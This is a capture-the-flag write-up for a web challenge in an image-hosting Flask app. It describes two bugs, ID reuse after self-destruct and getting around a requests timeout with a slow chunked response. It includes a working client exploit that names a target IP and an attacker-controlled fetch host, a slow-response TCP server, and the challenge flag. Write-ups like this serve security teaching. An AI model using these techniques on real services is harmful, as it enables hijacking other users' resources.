# Bugs

## Bug 1 - Use After Destruct (?) 

- After self-destruct, didn't delete original file(+mosaic file)
- However, ID that referencing the file is deleted on Database.

```python
@app.post('/')
def add_image():
    form = AddImageForm()

    print(form)

    if form.validate_on_submit():
        file = form.image.data
        password = form.password.data
        id_ = form.id.data or uuid4().hex
        image_url = form.image_url.data

        url = __add_image(password, id_, file=file, image_url=image_url)
```
- So, We can make new ID for original file

## Bug 2 - bypass `requests` timeout 

- DB insert is executed after 5 seconds, and the timeout for requests is 3 seconds.
- But, We can ignore the timeout with a slow HTTP response.

```python
def __add_image(password, id_, file=None, image_url=None, admin=False):
    t = Thread(target=convert_and_save, args=(id_, file, image_url))
    t.start()

    # no need, but time to waiting heavy response makes me excited!!
    if not admin:
        time.sleep(5)

    if file:
        mimetype = file.content_type
    elif image_url.endswith('.jpg'):
        mimetype = 'image/jpg'
    else:
        mimetype = 'image/png'

    db.add_image(id_, mimetype, password)

    return urljoin(URLBASE, id_)


def convert_and_save(id, file=None, url=None):
    try:
        if url:
            res = requests.get(url, timeout=3)
            image_bytes = res.content
        elif file:
            image_bytes = io.BytesIO()
            file.save(image_bytes)
            image_bytes = image_bytes.getvalue()
```


# Exploit

- Client

```python
from requests import *

url = "http://35.200.21.52/"
# url = "http://localhost"

url_ = get(f"{url}/trial").json()['url']
print(url_)

id_ = url_.split("/")[-1]
print(id_)

get(url_)

print('sleep..')
import time
time.sleep(11)
print('done')
form = {'password':'1234','id':id_, 'image_url':"http://cau.0wn.kr:443/b.png"}
r = post(f"{url}", data=form)
print(r.text)

time.sleep(5)

print("go")
```

- Server

```python
import socketserver
import time


response_data = '''HTTP/1.1 200 OK
Server: Apache
Keep-Alive: timeout=2, max=200
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/xml'''.replace('\n', '\r\n')

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            data = self.request.recv(1024).decode('utf-8')
            if data == "": continue
            print('[recv] ', data)

            for data in response_data:
                self.request.send(data.encode())
                time.sleep(1) # make delay


if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 443
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        server.serve_forever()
```

- **Flag: LINECTF{db3b30d05eb5e625a50a3925a35810f2}**